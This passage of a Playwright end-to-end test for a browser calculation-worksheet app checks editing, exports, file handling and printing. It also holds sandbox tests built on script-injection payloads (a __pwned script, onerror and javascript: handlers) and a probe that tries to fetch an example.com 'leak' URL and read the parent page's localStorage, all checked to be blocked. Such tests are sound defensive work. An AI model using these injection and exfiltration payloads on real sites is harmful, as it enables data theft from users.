// End-to-end check of the browser build (calcpad-web on the calcpad-wasm engine), headless
// Chromium via Playwright.
//
//   1. load the page, type a worksheet into the editor, read the result in the preview;
//   2. run a sample of CalcpadCE's Examples/Tests through the UI (editor content, then
//      Export > Preview > Save HTML, the path that renders without line anchors as the CLI
//      stubs do) and save the bodies for tools/compare_browser.py;
//   3. record every network request and fail if any calculation request leaves the page;
//   4. save a screenshot to tools/out/browser.png;
//   5. input forms (#UI), the file library (#include, #read), #write downloads, open by
//      drop, save, recent files and printing;
//   6. the same build served from a sub folder.
//
// The build is served by a plain static file server (no Calcpad.Server, no vite), at "/" and
// under "/calcs/", which is what any static host does.
//
// Usage (from web/, after `npm run build:wasm && npm run build`):
//   node e2e/browser-check.mjs [--ref ../../calcpad-ref] [--port 4180]
import { replaceCStyleOperators } from '../calcpad-web/src/wasm/c-style.ts';
import { createServer } from 'node:http';
import { execFile, execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { dirname, extname, join, normalize, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';

const here = dirname(fileURLToPath(import.meta.url));
const web = resolve(here, '..');
const repo = resolve(web, '..');
const arg = (name, def) => {
    const i = process.argv.indexOf(name);
    return i > 0 ? process.argv[i + 1] : def;
};
const ref = resolve(arg('--ref', resolve(repo, '..', 'calcpad-ref')));
const port = Number(arg('--port', '4180'));
const origin = `http://127.0.0.1:${port}`;
const out = join(repo, 'tools', 'out');
const renderedDir = join(out, 'browser');
rmSync(renderedDir, { recursive: true, force: true });
mkdirSync(renderedDir, { recursive: true });

const failures = [];
const check = (ok, what) => {
    console.log(`${ok ? 'ok  ' : 'FAIL'} ${what}`);
    if (!ok) failures.push(what);
};

// ---- serve web/calcpad-web/dist as static files, at / and under /calcs/ -------------------
// --dist DIR checks another build (for example one made with CALCS_BASE=/calcs/, whose files live in DIR).
const dist = resolve(arg('--dist', join(web, 'calcpad-web', 'dist')));
const TYPES = {
    '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.mjs': 'text/javascript', '.css': 'text/css',
    '.wasm': 'application/wasm', '.json': 'application/json', '.png': 'image/png', '.svg': 'image/svg+xml',
    '.woff2': 'font/woff2', '.otf': 'font/otf', '.ttf': 'font/ttf', '.ico': 'image/x-icon', '.md': 'text/plain',
};
const server = createServer((req, res) => {
    let path = decodeURIComponent(new URL(req.url, 'http://x').pathname);
    if (path.startsWith('/calcs/')) path = path.slice('/calcs'.length);
    if (path.endsWith('/')) path += 'index.html';
    const file = normalize(join(dist, path));
    if (!file.startsWith(dist) || !existsSync(file) || !statSync(file).isFile()) {
        res.writeHead(404);
        res.end('not found');
        return;
    }
    res.writeHead(200, { 'Content-Type': TYPES[extname(file)] ?? 'application/octet-stream' });
    res.end(readFileSync(file));
});
await new Promise((ok) => server.listen(port, '127.0.0.1', ok));
const serverLog = '';
const stop = () => server.close();

async function waitForServer() {
    for (let i = 0; i < 100; i++) {
        try {
            const r = await fetch(`${origin}/wasm/calcpad_wasm_bg.wasm`);
            if (r.ok) return new Uint8Array(await r.arrayBuffer());
        } catch { /* not up yet */ }
        await new Promise((r) => setTimeout(r, 200));
    }
    throw new Error(`server did not start:\n${serverLog}`);
}
const served = await waitForServer();
const local = readFileSync(join(dist, 'wasm', 'calcpad_wasm_bg.wasm'));
check(Buffer.compare(Buffer.from(served), local) === 0, `server on :${port} serves this tree's dist/wasm`);

// ---- browser --------------------------------------------------------------------------------
const browser = await chromium.launch();
const context = await browser.newContext({ viewport: { width: 1500, height: 900 }, acceptDownloads: true });
const requests = [];
context.on('request', (r) => requests.push({ method: r.method(), url: r.url() }));
// Requests the page's CSP stopped before they reached the network (Playwright reports them as failed).
const cspBlocked = new Set();
context.on('requestfailed', (r) => { if (/csp/i.test(r.failure()?.errorText ?? '')) cspBlocked.add(r.url()); });
// Page errors from upstream examples' own scripts (section 7) are theirs, not the app's.
let examplePageErrors = null;
// The settings the stubs were rendered with (.github/scripts/CliSettingsComparison.xml):
// the web defaults with vector graphics on.
// Printing: count print() calls on the print frame instead of opening a dialog. The frame is
// sandboxed without scripts, so the stub is put on its window from this page when it loads
// (print.ts calls print() only after the load event and a fonts check).
await context.addInitScript(() => {
    if (window !== window.top) return;
    new MutationObserver((records) => {
        for (const r of records) for (const n of r.addedNodes) {
            if (!(n instanceof HTMLIFrameElement) || !(n.getAttribute('sandbox') ?? '').includes('allow-modals')) continue;
            n.addEventListener('load', () => {
                if (window.__realPrint) return;
                const w = n.contentWindow;
                window.__printSandbox = n.getAttribute('sandbox');
                w.print = () => {
                    window.__printed = (window.__printed ?? 0) + 1;
                    window.__printedHtml = w.document.documentElement.outerHTML;
                };
            });
        }
    }).observe(document, { childList: true, subtree: true });
});
// Without the File System Access API, so saving takes the download path, which the test can see.
await context.addInitScript(() => {
    if (window !== window.top) return;
    delete window.showSaveFilePicker;
    delete window.showOpenFilePicker;
});
await context.addInitScript(() => {
    if (window !== window.top) return; // the sandboxed result frames have no storage
    if (sessionStorage.getItem('e2e-seeded')) return;
    sessionStorage.setItem('e2e-seeded', '1');
    localStorage.clear();
    localStorage.setItem('calcpad-settings', JSON.stringify({
        math: { formatString: '', decimals: 2, degrees: 0, isComplex: false, substitute: true, formatEquations: true,
            zeroSmallMatrixElements: true, showHiddenOutput: false, maxOutputCount: 20, precision: 1e-14, tol: 1e-6 },
        plot: { imagePath: '', imageUri: '', screenScaleFactor: 2, lightDirection: 'NorthWest', vectorGraphics: true,
            colorScale: 'Rainbow', smoothScale: false, shadows: true, isAdaptive: true, width: 500, height: 300, step: 0 },
        server: { url: '', mode: 'auto' },
        isUs: true,
    }));
});
const page = await context.newPage();
// The page asks before it is left with unsaved changes (the check reloads a dirty document): leave.
page.on('dialog', d => { if (d.type() === 'beforeunload') void d.accept(); });
const pageErrors = [];
page.on('pageerror', (e) => (examplePageErrors ?? pageErrors).push(e.message));
const consoleLines = [];
page.on('console', (m) => !m.text().includes('[Snippets]') && consoleLines.push(`${new Date().toISOString().slice(17, 23)} ${m.type()} ${m.text().slice(0, 200)}`));
await page.goto(`${origin}/`);
await page.waitForFunction(() => (window).calcpadActiveEditor != null, null, { timeout: 30000 });

/** Text of the results frame that contains `marker`. */
async function previewText(marker) {
    for (const f of page.frames()) {
        if (f === page.mainFrame()) continue;
        const t = await f.evaluate(() => document.body?.innerText ?? '').catch(() => '');
        if (t.includes(marker)) return t;
    }
    return '';
}

/** Text of a frame that contains `marker` and matches `re`, else of any frame with `marker`. */
async function framesMatching(marker, re) {
    let fallback = '';
    for (const f of page.frames()) {
        if (f === page.mainFrame()) continue;
        const t = await f.evaluate(() => document.body?.innerText ?? '').catch(() => '');
        if (!t.includes(marker)) continue;
        if (re.test(t)) return t;
        fallback = t;
    }
    return fallback;
}

// ---- 1. type a worksheet ------------------------------------------------------------------
const editorBox = page.locator('.monaco-editor').first();
await editorBox.click();
await page.keyboard.press('ControlOrMeta+A');
await page.keyboard.press('Delete');
for (const line of ["'Typed in the browser", 'L = 6m', 'q = 10kN/m', 'M = q*L^2/8']) {
    await page.keyboard.type(line, { delay: 5 });
    await page.keyboard.press('Escape');
    await page.keyboard.press('Enter');
}
const expected = /M\s*=[\s\S]*=\s*45\s*kNm/;
let typed = '';
for (let i = 0; i < 100 && !expected.test(typed); i++) {
    await page.waitForTimeout(200);
    typed = await previewText('Typed in the browser');
}
check(expected.test(typed), `typed worksheet renders M = q·L²/8 = ... = 45 kNm (preview: ${JSON.stringify(typed.slice(0, 160))})`);
await page.screenshot({ path: join(out, 'browser.png') });

// ---- 2. sample of Examples through the UI ------------------------------------------------
const only = arg('--only', '');
const sample = JSON.parse(readFileSync(join(here, 'sample.json'), 'utf8')).filter((f) => f.includes(only));
// Chromium blocks a tab's automatic downloads after about ten (the export download comes
// after an async render, outside the click's user gesture), so reload every few files.
const DOWNLOADS_PER_PAGE = 8;
async function openExportTab() {
    await page.waitForFunction(() => (window).calcpadActiveEditor != null, null, { timeout: 30000 });
    // Export is a dialog opened from the Document ribbon (the sidebar has no Export tab any more).
    if (await page.locator('.tab-content.as-dialog .export-group').first().isVisible().catch(() => false)) return;
    const btn = page.locator('[data-ribbon-btn=d-export]').first();
    if (!(await btn.isVisible())) await page.locator('.ribbon-tab, [role=tab]', { hasText: /^\s*Document\s*$/ }).first().click();
    await btn.click({ timeout: 10000 });
    await page.locator('.tab-content.as-dialog .export-group').first().waitFor({ timeout: 10000 });
}
await openExportTab();
const previewGroup = page.locator('.export-group').filter({ has: page.locator('.export-group-title', { hasText: /^Preview$/ }) });
const saveHtml = previewGroup.getByRole('button', { name: /Save HTML/ });
const index = [];
for (const [n, rel] of sample.entries()) {
    if (n > 0 && n % DOWNLOADS_PER_PAGE === 0) {
        await page.reload();
        await openExportTab();
    }
    const text = readFileSync(join(ref, rel), 'utf8').replace(/^﻿/, '');
    await page.evaluate((t) => (window).calcpadActiveEditor.setValue(t), text);
    const started = Date.now();
    let download;
    try {
        [download] = await Promise.all([page.waitForEvent('download', { timeout: 120000 }), saveHtml.click()]);
    } catch (err) {
        console.log(`no download for ${rel}; last console lines:\n${consoleLines.slice(-40).join('\n')}`);
        throw err;
    }
    const html = readFileSync(await download.path(), 'utf8');
    // The template mentions <body> in a CSS comment, so look after </head>.
    const open = html.indexOf('<body', html.indexOf('</head>'));
    const bodyStart = html.indexOf('>', open) + 1;
    const bodyEnd = html.lastIndexOf('</body>');
    // template.html: "<body>\n    {{CONTENT}}\n</body>"
    let body = html.slice(bodyStart, bodyEnd);
    if (body.startsWith('\n    ')) body = body.slice(5);
    if (body.endsWith('\n')) body = body.slice(0, -1);
    const name = rel.replace(/\//g, '__') + '.html';
    writeFileSync(join(renderedDir, name), `<div class="calcpad-output">${body}</div>`);
    index.push({ file: rel, rendered: name, ms: Date.now() - started });
    console.log(`     rendered ${rel} (${Date.now() - started} ms)`);
}
writeFileSync(join(renderedDir, 'index.json'), JSON.stringify(index, null, 1));

// ---- 5. phase 4: input forms, files, #read/#write, print ---------------------------------
await page.reload();
await page.waitForFunction(() => (window).calcpadActiveEditor != null && (window).calcpadFiles != null, null, { timeout: 30000 });
const setEditor = (text) => page.evaluate((t) => (window).calcpadActiveEditor.setValue(t), text);
async function resultMode(name) {
    const modal = page.locator('.modal-backdrop');
    if (await modal.count()) {
        console.log(`     modal before ${name}: ${JSON.stringify((await modal.first().innerText()).slice(0, 300))}`);
        await page.screenshot({ path: join(out, 'browser-modal.png') });
    }
    await page.locator('.preview-mode-group .toolbar-btn', { hasText: new RegExp(`^${name}$`) }).click({ timeout: 10000 });
    // Leaving the input form after entering values asks whether to keep them (upstream's prompt).
    const dontSave = page.locator('.modal-backdrop button', { hasText: /^Don't Save$/ });
    if (await dontSave.waitFor({ timeout: 1500 }).then(() => true, () => false)) await dontSave.click();
}
async function frameWith(selector, timeout = 15000) {
    for (let t = 0; t < timeout; t += 200) {
        for (const f of page.frames()) {
            if (f === page.mainFrame()) continue;
            if (await f.$(selector).catch(() => null)) return f;
        }
        await page.waitForTimeout(200);
    }
    return null;
}
async function frameText(marker, timeout = 15000) {
    for (let t = 0; t < timeout; t += 200) {
        const text = await previewText(marker);
        if (text) return text;
        await page.waitForTimeout(200);
    }
    return '';
}
async function drop(files) {
    await page.evaluate((files) => {
        const dt = new DataTransfer();
        for (const f of files) dt.items.add(new File([f.text], f.name));
        document.body.dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }));
    }, files);
}

// #UI input form: an entry the user changes, and a datagrid hydrated by jspreadsheet.
await setEditor("'UI form check\n#UI L = 10m\nA = L*2m\n#UI v = [1; 2; 3]\ns = sum(v)");
await resultMode('Input');
const form = await frameWith('input.calcpad-ui-input');
check(form != null, 'input mode renders the #UI entry as an input box');
if (form) {
    check(await form.$eval('input.calcpad-ui-input', (e) => e.value) === '10', 'the entry holds the value without its unit (10)');
    const grid = await frameWith('.calcpad-ui-datagrid .jss_worksheet, .calcpad-ui-datagrid table');
    check(grid != null, 'the datagrid is hydrated (the libraries were injected)');
    // The form can render more than once while it settles, and typing into a frame that was
    // replaced posts nothing, so the live frame is looked up again for each attempt.
    let text = '';
    for (let attempt = 0; attempt < 3 && !/=\s*24\s*m/.test(text); attempt++) {
        await page.waitForTimeout(1500);
        const live = await frameWith('input.calcpad-ui-input');
        if (!live) continue;
        await live.fill('input.calcpad-ui-input', '12');
        await live.press('input.calcpad-ui-input', 'Enter');
        for (let i = 0; i < 75 && !/=\s*24\s*m/.test(text); i++) {
            await page.waitForTimeout(200);
            // The preview is double buffered, so the stale frame can still be there: look at all.
            text = await framesMatching('UI form check', /=\s*24\s*m/);
        }
    }
    check(/=\s*24\s*m/.test(text), `changing L to 12 re-renders A = 24 m² (form: ${JSON.stringify(text.slice(0, 120))})`);
}
await page.screenshot({ path: join(out, 'browser-input-form.png') });
await resultMode('Preview');

const downloads = [];
page.on('download', (d) => downloads.push(d));

// The library: a dropped worksheet serves #include, a dropped CSV serves #read.
await drop([{ name: 'lib-check.cpd', text: 'k = 5\n' }, { name: 'data-check.csv', text: '1,2\n3,4\n' }]);
await page.waitForFunction(() => (window).calcpadFiles.library.list().length >= 2, null, { timeout: 10000 });
// The dropped worksheet opened in a tab of its own; the check runs in a new one.
await page.locator('[data-ribbon-btn=file]').click();
await page.locator('.cprs-menu button', { hasText: /^New Calcpad worksheet/ }).click();
await setEditor("'Library check\n#include lib-check.cpd\nk2 = k*2\n#read M from data-check.csv\nt = sum(M)\n#write M to out-check.csv");
const libText = await frameText('Library check');
check(/k2\s*=[\s\S]*=\s*10/.test(libText), `#include resolves against the library (k2 = 10) (${JSON.stringify(libText.slice(0, 160))})`);
check(/t\s*=[\s\S]*=\s*10/.test(libText) && libText.includes('was successfully read from'), '#read reads a CSV from the library (t = 10)');
check(libText.includes('will be written to'), 'a preview render only reports the #write (the default write mode is Report Only)');

// #write in the report downloads the file, once: a render that writes the same content again
// (the report re-renders often) does not download it again.
await resultMode('Report');
await page.waitForTimeout(3000);
await resultMode('Preview');
await resultMode('Report');
for (let i = 0; i < 50 && !downloads.some((d) => d.suggestedFilename() === 'out-check.csv'); i++) await page.waitForTimeout(200);
await page.waitForTimeout(2000);
const written = downloads.filter((d) => d.suggestedFilename() === 'out-check.csv');
check(written.length === 1, `#write downloads out-check.csv once over two report renders (${written.length})`);
if (written.length) check(readFileSync(await written[0].path(), 'utf8') === '1,2\n3,4\n', '#write writes the matrix as CSV');

// Print: the report goes to the browser's print(), and a worksheet's own script does not run in
// the print frame (which shares this page's origin): it is removed before printing.
// (No single quotes inside: a single quote ends a Calcpad comment.)
await setEditor("'Library check\n'<script>try { window.top.__pwned = 1 } catch (e) {}</script><img src=\"data:,\" onerror=\"try { window.top.__pwned = 2 } catch (e) {}\"><a href=\"javascript:window.top.__pwned=3\">link</a>\nq = 1");
await frameText('Library check');
await page.evaluate(() => { (window).__printed = 0; (window).__pwned = undefined; });
await page.locator('.preview-toolbar .toolbar-btn', { hasText: /^Print PDF$/ }).click();
await page.waitForFunction(() => (window).__printed > 0, null, { timeout: 15000 }).catch(() => {});
const printed = await page.evaluate(() => ({ n: (window).__printed, html: (window).__printedHtml ?? '' }));
check(printed.n === 1 && printed.html.includes('@page') && printed.html.includes('Library check'),
    `Print PDF prints the report through the browser (${printed.n} print call)`);
await page.waitForTimeout(1500);
const pwned = await page.evaluate(() => ({ pwned: (window).__pwned, sandbox: (window).__printSandbox }));
check(pwned.pwned === undefined, `a worksheet script does not run during Print (${pwned.pwned})`);
check(!/__pwned/.test(printed.html), 'the worksheet script and handlers were removed from the printed page');
check(pwned.sandbox === 'allow-same-origin allow-modals', `the print frame is sandboxed without scripts (${pwned.sandbox})`);
// The real print(), unstubbed: Chrome ignores print() from a frame whose sandbox lacks
// allow-modals and says so on the console.
const printConsole = [];
const onPrintConsole = (m) => printConsole.push(m.text());
page.on('console', onPrintConsole);
await page.evaluate(() => { (window).__realPrint = true; });
await page.locator('.preview-toolbar .toolbar-btn', { hasText: /^Print PDF$/ }).click();
await page.waitForTimeout(3000);
await page.evaluate(() => { (window).__realPrint = false; });
page.off('console', onPrintConsole);
check(!printConsole.some((t) => /Ignored call to 'print\(\)'/.test(t)), 'the sandboxed print frame may call the real print()');
await resultMode('Preview');

// Open by drop, edit, save (download), and the recent list.
await drop([{ name: 'opened-check.cpd', text: "'Opened by drop\nz = 3" }]);
await page.waitForFunction(() => (window).calcpadTabs?.activeTab?.filePath === '/opened-check.cpd', null, { timeout: 10000 });
check(true, 'a dropped .cpd opens in its own tab');
await setEditor("'Opened by drop\nz = 4");
await page.locator('.monaco-editor').first().click();
const [saved] = await Promise.all([page.waitForEvent('download', { timeout: 10000 }), page.keyboard.press('ControlOrMeta+S')]);
check(saved.suggestedFilename() === 'opened-check.cpd' && readFileSync(await saved.path(), 'utf8') === "'Opened by drop\nz = 4",
    `Ctrl+S saves the worksheet (${saved.suggestedFilename()})`);
check(await page.evaluate(() => !(window).calcpadTabs.activeTab.dirty), 'the saved tab is no longer dirty');
const savedText = await (async () => {
    let t = '';
    for (let i = 0; i < 75 && !/z\s*=\s*4/.test(t); i++) {
        await page.waitForTimeout(200);
        t = await framesMatching('Opened by drop', /z\s*=\s*4/);
    }
    return t;
})();
check(/z\s*=\s*4/.test(savedText), `the preview follows the edit (z = 4) (${JSON.stringify(savedText.slice(0, 60))})`);
await page.locator('[data-ribbon-btn=file]').click();
const menuText = await page.locator('.cprs-menu').innerText();
check(menuText.includes('opened-check.cpd') && menuText.includes('lib-check.cpd') && menuText.includes('data-check.csv'),
    'the File menu lists the recent worksheet and the library');
await page.screenshot({ path: join(out, 'browser-file-menu.png') });
await page.keyboard.press('Escape');

// ---- 7. worksheet scripts: the library list, the CSP, blocked scripts -------------------
const LIBS = JSON.parse(readFileSync(join(web, 'calcpad-web', 'src', 'wasm', 'library-defaults.json'), 'utf8'));
const LISTED = new Map(LIBS.flatMap((l) => l.files.map((f) => [f.url, l.id])));
const online = await fetch('https://code.jquery.com/jquery-3.6.3.min.js', { method: 'HEAD' }).then((r) => r.ok, () => false);
const frameConsole = [];
page.on('console', (m) => frameConsole.push(m.text()));
const cdp = await context.newCDPSession(page);
await cdp.send('Network.setCacheDisabled', { cacheDisabled: true });
const responses = new Map();
context.on('response', (r) => responses.set(r.url(), r.status()));
/** `fn` evaluated in each result frame whose text contains `marker` (the preview is double buffered). */
async function framesQuery(fn, marker) {
    const out = [];
    for (const f of page.frames()) {
        if (f === page.mainFrame()) continue;
        const text = await f.evaluate(() => document.documentElement?.innerText ?? '').catch(() => '');
        if (marker && !text.includes(marker)) continue;
        out.push(await f.evaluate(fn).catch(() => null));
    }
    return out.filter((x) => x != null);
}
const reached = (u) => requests.some((r) => r.url.startsWith(u) && !cspBlocked.has(r.url));

// (b) An unlisted script does not load, and the preview names it.
const UNLISTED = 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js';
const UNLISTED_MODULE = 'https://cdn.jsdelivr.net/npm/lodash-es@4.17.21/+esm';
await setEditor(`'Unlisted check\n'<script src="${UNLISTED}"></script>\n'<script type="module">import "${UNLISTED_MODULE}";</script>\nu = 1`);
let notes = [];
for (let i = 0; i < 50 && notes.filter((n) => n.includes(UNLISTED_MODULE)).length === 0; i++) {
    await page.waitForTimeout(200);
    notes = (await framesQuery(() => Array.from(document.querySelectorAll('.cprs-blocked')).map((e) => e.textContent), 'Unlisted check')).flat();
}
check(notes.some((n) => n.includes(`Script not loaded: ${UNLISTED} is not in the library list`)), `an unlisted <script src> is replaced by a note naming it (${JSON.stringify(notes.slice(0, 2))})`);
check(notes.some((n) => n.includes(`Script not loaded: ${UNLISTED_MODULE} is not in the library list`)), 'an unlisted module import is blocked and the note names it');
check(!reached(UNLISTED) && !reached(UNLISTED_MODULE), 'neither unlisted script reached the network');

// (c) A worksheet script cannot send data or read storage.
const PROBE = `'<script>(async function(){var r=[];`
    + `try{await fetch("https://example.com/leak?d=1");r.push("fetch=allowed")}catch(e){r.push("fetch=blocked")}`
    + `try{localStorage.getItem("x");r.push("storage=allowed")}catch(e){r.push("storage=blocked")}`
    + `try{window.parent.localStorage.getItem("calcpad-settings");r.push("parent=allowed")}catch(e){r.push("parent=blocked")}`
    + `try{new Image().src="https://example.com/pixel.png";r.push("img=tried")}catch(e){r.push("img=blocked")}`
    + `var p=document.createElement("p");p.id="probe";p.textContent="PROBE "+r.join(" ");document.body.appendChild(p)})()</script>`;
await setEditor(`'Probe check\n${PROBE}\np = 1`);
let probe = [];
for (let i = 0; i < 50 && !probe.some((t) => t?.startsWith('PROBE')); i++) {
    await page.waitForTimeout(200);
    probe = await framesQuery(() => document.getElementById('probe')?.textContent ?? null, 'Probe check');
}
const probeText = probe.find((t) => t?.startsWith('PROBE')) ?? '';
check(probeText.includes('fetch=blocked'), `a worksheet script cannot fetch() (${probeText})`);
check(probeText.includes('storage=blocked') && probeText.includes('parent=blocked'), 'a worksheet script cannot read its own or the app\'s storage');
await page.waitForTimeout(500);
check(!reached('https://example.com'), 'nothing reached example.com (fetch nor image)');

// (a) The upstream examples that load scripts render with their libraries.
const scriptedFiles = execFileSync('/usr/bin/grep', ['-rli', '<script', '--include=*.cpd', '.'], { cwd: join(ref, 'Examples'), encoding: 'utf8' })
    .trim().split('\n').map((f) => f.replace(/^\.\//, '')).sort();
check(scriptedFiles.length === 26, `26 upstream examples carry scripts (${scriptedFiles.length})`);
// What stays blocked on purpose: a relative script that is not a library (Toc.cpd), a texture
// image from another site, and the model file model-viewer fetches (connect-src 'none').
const EXPECTED_NOTES = {
    'Engineering/Formatting/Toc.cpd': ['./toc.js'],
    'Engineering/3D, Plotting, Drawing/Parametric 3D Drawing of RC Beam.cpd': ['cdn.polyhaven.com'],
    'Engineering/3D, Plotting, Drawing/Bolt 3D Model.cpd': ['bolt_and_nut.glb'],
};
if (!online) {
    console.log('     skipped: the 26 scripted examples need the network to load their libraries from the CDNs, and it is not reachable');
} else {
    const scriptedFailures = [];
    examplePageErrors = [];
    for (const [n, rel] of scriptedFiles.entries()) {
        const marker = `cprs-e2e-${n}-marker`;
        const text = `'${marker}\n` + readFileSync(join(ref, 'Examples', rel), 'utf8').replace(/^﻿/, '');
        const wanted = [...LISTED.keys()].filter((u) => text.includes(u));
        const libs = new Set(wanted.map((u) => LISTED.get(u)));
        const expectFiles = LIBS.filter((l) => libs.has(l.id)).flatMap((l) => l.files.map((f) => f.url));
        // The files an example includes (svg_drawing.cpd, Helper.cpd) sit next to it: into the library.
        for (const m of text.matchAll(/^#include\s+(.+?)\s*$/gm)) {
            const inc = join(ref, 'Examples', dirname(rel), m[1]);
            if (existsSync(inc)) await page.evaluate(([name, t]) => (window).calcpadFiles.library.putText(name, t), [m[1], readFileSync(inc, 'utf8')]);
        }
        responses.clear();
        frameConsole.length = 0;
        await setEditor(text);
        // Wait for this example's page (Beam Impact Analysis takes about 40 s to calculate),
        // then for its library files.
        for (let i = 0; i < 300 && (await framesQuery(() => 1, marker)).length === 0; i++) await page.waitForTimeout(500);
        for (let i = 0; i < 75 && !expectFiles.every((u) => responses.get(u) === 200); i++) await page.waitForTimeout(200);
        await page.waitForTimeout(1500);
        const problems = [];
        for (const u of expectFiles) if (responses.get(u) !== 200) problems.push(`${u} not loaded (${responses.get(u) ?? 'no response'})`);
        const tags = (await framesQuery(() => Array.from(document.querySelectorAll('script[src]')).map((e) => [e.getAttribute('src'), e.getAttribute('integrity')]), marker)).flat();
        for (const [src, integrity] of tags) if (LISTED.has(src) && !integrity) problems.push(`${src} has no integrity`);
        const bad = frameConsole.filter((t) => /integrity|Content Security Policy|Refused to/i.test(t));
        const allowed = EXPECTED_NOTES[rel] ?? [];
        const blocked = (await framesQuery(() => Array.from(document.querySelectorAll('.cprs-blocked')).map((e) => e.textContent), marker)).flat();
        for (const n of new Set(blocked)) if (!allowed.some((a) => n.includes(a))) problems.push(`note: ${n}`);
        for (const t of new Set(bad)) if (!allowed.some((a) => t.includes(a))) problems.push(`console: ${t.slice(0, 160)}`);
        if (problems.length) {
            scriptedFailures.push(`${rel}: ${problems.join('; ')}`);
            for (const pr of problems) console.log(`       ${pr.slice(0, 300)}`);
        }
        console.log(`     ${problems.length ? 'PROBLEM' : 'ok'} ${rel} (${expectFiles.length} library files)`);
    }
    examplePageErrors = null;
    check(scriptedFailures.length === 0, `the 26 scripted examples load their listed libraries, hashed, with no other script blocked (${scriptedFailures.join(' | ').slice(0, 600)})`);
}
await cdp.send('Network.setCacheDisabled', { cacheDisabled: false });

// Settings > Libraries and Insert > Libraries.
// Settings is a dialog opened from the Calculation ribbon (the sidebar has no Settings tab any more).
{
    const btn = page.locator('[data-ribbon-btn=k-settings]').first();
    if (!(await btn.isVisible())) await page.locator('.ribbon-tab, [role=tab]', { hasText: /^\s*Calculation\s*$/ }).first().click();
    await btn.click({ timeout: 10000 });
    // Libraries is on the Advanced tab of the dialog.
    await page.locator('.tab-content.as-dialog [role=tab][data-settings-tab=advanced]').click({ timeout: 10000 });
    await page.locator('.tab-content.as-dialog .cprs-libraries .section-header').waitFor({ timeout: 10000 });
}
await page.locator('.cprs-libraries .section-header').click();
const entries = await page.locator('.cprs-libraries .cprs-lib').count();
check(entries === LIBS.length, `Settings > Libraries lists the ${LIBS.length} built-in entries (${entries})`);
const jq = page.locator('.cprs-libraries .cprs-lib[data-library="jquery"]');
check((await jq.innerText()).includes('jquery-3.6.3.min.js') && (await jq.innerText()).includes('sha384-'), 'an entry shows its URL and hash');
await jq.locator('.cprs-remove').click();
const JQ_SHEET = `'jQuery check\n'<script src="https://code.jquery.com/jquery-3.6.3.min.js"></script>\nj = 1`;
await setEditor(JQ_SHEET);
let jqNote = [];
for (let i = 0; i < 40 && !jqNote.flat().some((n) => n.includes('jquery-3.6.3')); i++) {
    await page.waitForTimeout(200);
    jqNote = await framesQuery(() => Array.from(document.querySelectorAll('.cprs-blocked')).map((e) => e.textContent), 'jQuery check');
}
check(jqNote.flat().some((n) => n.includes('jquery-3.6.3.min.js is not in the library list')), 'a removed entry is blocked like any unlisted script');
await page.locator('.cprs-libraries .cprs-restore').click();
check(await page.locator('.cprs-libraries .cprs-lib[data-library="jquery"]').count() === 1, 'a removed built-in entry can be restored');
if (online) {
    await page.locator('.cprs-libraries .cprs-url-input').fill(UNLISTED);
    await page.locator('.cprs-libraries .cprs-fetch').click();
    await page.locator('.cprs-libraries .cprs-pending').waitFor({ timeout: 20000 });
    const shown = await page.locator('.cprs-libraries .cprs-new-hash').innerText();
    const real = 'sha384-' + createHash('sha384').update(Buffer.from(await (await fetch(UNLISTED)).arrayBuffer())).digest('base64');
    check(shown === real, `Add library shows the file's real sha384 before adding (${shown.slice(0, 20)}...)`);
    check(await page.locator('.cprs-libraries .cprs-lib').count() === LIBS.length, 'nothing is added before the user confirms');
    await page.locator('.cprs-libraries .cprs-confirm').click();
    check(await page.locator('.cprs-libraries .cprs-lib').count() === LIBS.length + 1, 'confirming adds the entry');
    await setEditor(`'Added check\n'<script src="${UNLISTED}"></script>\n'<script>document.write("<p id=lodash>"+(typeof _)+"</p>")</script>\nw = 1`);
    let lodash = [];
    for (let i = 0; i < 50 && !lodash.includes('function'); i++) {
        await page.waitForTimeout(200);
        lodash = await framesQuery(() => document.getElementById('lodash')?.textContent ?? null, 'Added check');
    }
    check(lodash.includes('function'), 'the added library loads in a worksheet');
    await page.locator('.cprs-libraries .cprs-lib').last().locator('.cprs-remove').click();
} else {
    console.log('     skipped: adding a library needs the network');
}
await page.screenshot({ path: join(out, 'browser-libraries.png') });
await page.keyboard.press('Escape');
await page.locator('.tab-content.as-dialog').waitFor({ state: 'detached', timeout: 5000 }).catch(() => {});
await page.locator('.calcpad-vue-ui .tab-container .tab', { hasText: /^Insert$/ }).first().click();
await setEditor('');
await page.locator('.cprs-insert-select').selectOption('d3');
await page.waitForTimeout(300);
const inserted = await page.evaluate(() => (window).calcpadActiveEditor.getValue());
check(inserted.includes(`'<script src="https://cdnjs.cloudflare.com/ajax/libs/d3/3.5.17/d3.min.js"></script>`), `Insert > Libraries inserts the script tag (${JSON.stringify(inserted.slice(0, 90))})`);

// ---- 8. Samples ----------------------------------------------------------------------------
const MANIFEST = JSON.parse(readFileSync(join(web, 'calcpad-web', 'public', 'samples', 'manifest.json'), 'utf8'));
const SAMPLES = MANIFEST.samples;
// Every convert the UI makes, with the errors its response carried (X-Calcpad-Errors).
await page.evaluate(() => {
    const inner = window.fetch;
    (window).__converts = [];
    window.fetch = async (input, init) => {
        const res = await inner(input, init);
        if (String(input instanceof Request ? input.url : input).includes('/api/calcpad/convert') && typeof init?.body === 'string') {
            try {
                const body = JSON.parse(init.body);
                const errors = JSON.parse(decodeURIComponent(res.headers.get('X-Calcpad-Errors') ?? '%5B%5D'));
                const html = await res.clone().text();
                (window).__converts.push({
                    content: String(body.content ?? '').replace(/\r\n/g, '\n'), preview: !!body.extraFiles, errors,
                    libraryImages: (html.match(/<img\b[^>]*\bsrc\s*=\s*["']data:image\//g) ?? []).length,
                });
            } catch { /* not ours to judge */ }
        }
        return res;
    };
});
// As the app opens a sample: C-style operators converted (c-style.ts).
const sampleText = (s) => replaceCStyleOperators(readFileSync(join(web, 'calcpad-web', 'public', s.file), 'utf8').replace(/^﻿/, '').replace(/\r\n/g, '\n'));
const dialog = page.locator('.cprs-samples');
const items = () => page.locator('.cprs-samples .cprs-s-item');
const shownIds = async () => (await items().evaluateAll((els) => els.map((e) => e.dataset.sampleId))).sort();
async function openSamples() {
    await page.locator('[data-ribbon-btn=file]').click();
    await page.locator('.cprs-menu button', { hasText: 'Samples...' }).click();
